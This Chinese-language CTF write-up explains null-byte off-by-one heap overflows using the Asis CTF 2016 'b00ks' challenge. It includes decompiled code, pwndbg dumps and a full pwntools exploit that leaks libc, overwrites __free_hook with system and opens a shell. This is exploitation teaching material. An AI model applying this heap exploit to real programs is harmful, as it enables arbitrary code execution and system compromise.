---
title: Off-by-one
date: 2020-10-15
author: x1ngg3
description: "(；′⌒)"
---

(；′⌒`)

<!-- more -->

### what is off-by-one

严格来说，off-by-one漏洞是一种特殊的溢出漏洞，指程序向缓冲区中写入时，写入的字节数超过了缓冲区本身的大小，并且只越界了一个字节。这种漏洞的产生往往与边界验证不严或字符串操作有关，当然也有可能写入的size正好就只多了一个字节：

- 使用循环语句向缓冲区中写入数据时，循环的次数设置错误导致多写入一个字节
- 字符串操作不合适，比如忽略了字符串末尾的`\x00`

一般而言，单字节溢出很难利用。但因为Linux中的堆管理机制ptmalloc验证的松散型，基于Linux堆的off-by-one漏洞利用起来并不复杂，而且威力强大。需要说明的是，`off-by-one`是可以基于各种缓冲区的，如栈、bss段等。但堆上的`off-by-one`在CTF中比较常见。



### 两种常见的off-by-one例子

#### 栅栏错误

多写入一个字节

```c
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)
    {
        ptr[i]=getchar();
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```



#### null byte off-by-one

第二十五个字节被设置为 `“\x00”`

```c
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;
}
```



### Asis CTF 2016 b00ks



#### 程序分析

首先题目提供了如下功能

```
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
```

其中对于 `create` 创建了三个堆块，一个 `name` 块，大小为自定义；一个 `description` 块，大小为自定义；一个 `book_ptr` 块，大小为固定，用来保存当前book的信息，如下：

```c
struct book_struct
{
    int book_id;    // offset:0
    char* book_name;    // offset:8    malloc(size)
    char* book_description;    // offset:16     malloc(size)
    int book_description_size;  // offset:24
}
```



#### 漏洞分析

不难发现，在程序最开始读入 `author_name` 和修改 `author_name` 的时候，都存在 `null byte off-by-one` 漏洞。

```c
signed __int64 sub_B6D()
{
  printf("Enter author name: ");
  if ( !my_read(author_name, 32) )
    return 0LL;
  printf("fail to read author_name", 32LL);
  return 1LL;
}
signed __int64 __fastcall my_read(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  if ( a2 <= 0 )
    return 0LL;
  buf = a1;
  for ( i = 0; ; ++i )
  {
    if ( read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == 10 )
      break;
    ++buf;
    if ( i == a2 )
      break;
  }
  *buf = 0;
  return 0LL;
}
```

那知道这一点又有什么用呢，可以看到，在保存 `book_struct` 结构体的时候，在数据段同时保存了这个结构体堆的地址：

```c
 book_ptr = malloc(0x20uLL);
if ( book_ptr )
{
	*(book_ptr + 6) = v1;         // size
    *(book_struct + v2) = book_ptr;// 在数据段存下这个堆的地址
    *(book_ptr + 2) = p;          // description
    *(book_ptr + 1) = ptr;        // name
    *book_ptr = ++id;             // id
    return 0LL;
}
```

回想起我们同时在数据段存了 `author_name`，二者有这样的关系：

```
.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17↑r
.data:0000000000202008                                         ; .data:off_202008↓o
.data:0000000000202010 book_struct     dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o
.data:0000000000202010                                         ; sub_BBD:loc_C1B↑o ...
.data:0000000000202018 author_name     dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o
.data:0000000000202018                                         ; sub_D1F+CA↑o
.data:0000000000202018 _data           ends
.data:0000000000202018
```

我们不妨在内存中直接观察看看，这里是在create一个book之后的结构，可以看到`boo1_struct_addr`就紧跟在`author_name`之后

```
pwndbg> x/30gx 0x555555756010
0x555555756010:	0x0000555555756060	0x0000555555756040
0x555555756020:	0x0000000100000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x6161616161616161	0x6161616161616161
0x555555756050:	0x6161616161616161	0x6161616161616161
0x555555756060:	0x0000555555758240	0x0000000000000000   指向了book1_struct_addr
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000000000000000
0x5555557560f0:	0x0000000000000000	0x0000000000000000
pwndbg> heap
Allocated chunk | IS_MMAPED
Addr: 0x555555757000
Size: 0xa363532

pwndbg> parseheap
addr                prev                size                 status              fd                bk                
0x555555757000      0x0                 0x1010               Used                None              None
0x555555758010      0x0                 0x110                Used                None              None	 book1_name
0x555555758120      0x0                 0x110                Used                None              None  book1_description
0x555555758230      0x0                 0x30                 Used                None              None  book1_struct
```

可以看到`author_name`和`book1_struct_addr`之间相差的正好是32个字节，在写入32个字节长度`author_name`时，会向`book1_struct_addr`写入一个字节的"\x00"，在`book1`被创建后"\x00"就会被覆盖掉，所以可以通过打印`author_name`来实现泄露`book1_struct_addr`的地址。



### 漏洞利用

创建两个`book`，通过`null byte off-by-one`，可以使`book1_struct_addr`指向`book1_description`，这里需要注意的是book1的size不要设置的太小，不然当`boo1_struct`低位字节被"\x00"覆盖之后不能正确落到`book1_description`，然后通过编辑`book1_description`来伪造`boo1_struct`，这个伪造的`book1_struct`中，使`book1_description`指向`book2_name`，从而依次覆盖掉`book2_name`和`book2_description`。现在我们通过edit book2就可以实现任意地址写了，但开启了got表不可写，但是但是可以改写`__free_hook`。

那可以实现任意改写之后，如何拿到shell权限呢，或者说**如何拿到libc基址呢。**

**这里的巧妙之处在于创建book2的时候，如果把size设的很高，现有的heap不足以分配，堆就会以mmap的形式进行扩展。而扩展的mmap与libc基址之间的偏移使固定的，所以我们可以根据这个固定偏移来计算出基址**。	

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r-xp     2000 0      /home/x1ngg3/Desktop/heap/books
    0x555555755000     0x555555756000 r--p     1000 1000   /home/x1ngg3/Desktop/heap/books
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/x1ngg3/Desktop/heap/books
    0x555555757000     0x555555779000 rw-p    22000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so   libc基址0x7ffff7a0d000
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```



### Exploit

```python
#!/usr/bin/env python

from pwn import *

context(log_level='debug', os='linux')

def create_book(target, name_size, book_name, desc_size, book_desc):
    target.recv()
    target.sendline('1')
    target.sendlineafter('Enter book name size: ', str(name_size))
    target.sendlineafter('Enter book name (Max 32 chars): ', book_name)
    target.sendlineafter('Enter book description size: ', str(desc_size))
    target.sendlineafter('Enter book description: ', book_desc)

def delete_book(target, book_id):
    target.recv()
    target.sendline('2')
    target.sendlineafter('Enter the book id you want to delete: ', str(book_id))

def edit_book(target, book_id, book_desc):
    target.recv()
    target.sendline('3')
    target.sendlineafter('Enter the book id you want to edit: ', str(book_id))
    target.sendlineafter('Enter new book description: ', book_desc)

def print_book(target):
    target.recvuntil('>')
    target.sendline('4')

def change_author_name(target, name):
    target.recv()
    target.sendline('5')
    target.sendlineafter('Enter author name: ', name)

def input_author_name(target, name):
    target.sendlineafter('Enter author name: ', name)

DEBUG = 0
LOCAL = 1

if LOCAL:
    target = process('./books')
else:
    target = remote('127.0.0.1', 5678)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# used for debug
image_base = 0x555555554000

if DEBUG:
    pwnlib.gdb.attach(target, 'b *%d\nc\n' % (image_base+0x1245))

input_author_name(target, 'a'*32)
create_book(target, 140 ,'book_1', 140, 'first book created')

# leak boo1_struct addr
print_book(target)
target.recvuntil('a'*32)
temp = target.recvuntil('\x0a')
book1_struct_addr = u64(temp[:-1].ljust(8, '\x00'))
book2_struct_addr = book1_struct_addr + 0x30

create_book(target, 0x21000, 'book_2', 0x21000, 'second book create')

# fake book1_struct
payload = 'a' * 0x40 + p64(1) + p64(book2_struct_addr + 8) * 2 + p64(0xffff)
edit_book(target, 1, payload)

change_author_name(target, 'a'*32)
# leak book2_name ptr
print_book(target)

target.recvuntil('Name: ')
temp = target.recvuntil('\x0a')
book2_name_ptr = u64(temp[:-1].ljust(8, '\x00'))

# find in debug: mmap_addr - libcbase
offset =  0x00007ffff7fb7010 - 0x7ffff7a0d000
libcbase = book2_name_ptr - offset

free_hook = libc.symbols['__free_hook'] + libcbase
system = libc.symbols['system'] + libcbase
binsh_addr = libc.search('/bin/sh').next() + libcbase

payload = p64(binsh_addr) + p64(free_hook)
edit_book(target, 1, payload)

payload = p64(system)
edit_book(target, 2, payload)

delete_book(target, 2)
target.interactive()
```



### reference

[堆中的 Off-By-One](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/)

[asis-ctf-2016 pwn 之 b00ks](https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/)